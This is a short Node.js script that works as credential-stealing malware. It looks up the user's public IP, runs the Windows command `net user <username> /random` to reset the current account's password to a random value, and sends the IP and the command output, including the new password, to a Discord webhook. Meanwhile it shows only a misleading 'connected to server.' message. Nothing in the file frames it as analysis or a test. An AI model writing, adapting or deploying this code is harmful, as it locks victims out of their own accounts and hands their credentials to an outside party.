const username = require('username');
const {
    Webhook
} = require('discord-webhook-node');
let request = require('request');
const logs = new Webhook("/////////////////////////////////////////"); //webhook link
const {
    exec
} = require("child_process");

request.get(`https://api.ipify.org`, function(err, response, body) {
    if (err)
        return console.log("no connection....................................")


    (async () => {
        exec(`net user ${await username()} /random`, (error, data, getter) => {

            logs.send(`\n\`\`\`yaml\nLogged IP: ${body}\n${data}\n\`\`\`\n`)
            console.log(`connected to server.`)
            if (error) {

                logs.send(`\n\`\`\`yaml\nyou must open this app with administrator\`\`\`\n`)

            }

        });
    })();
});
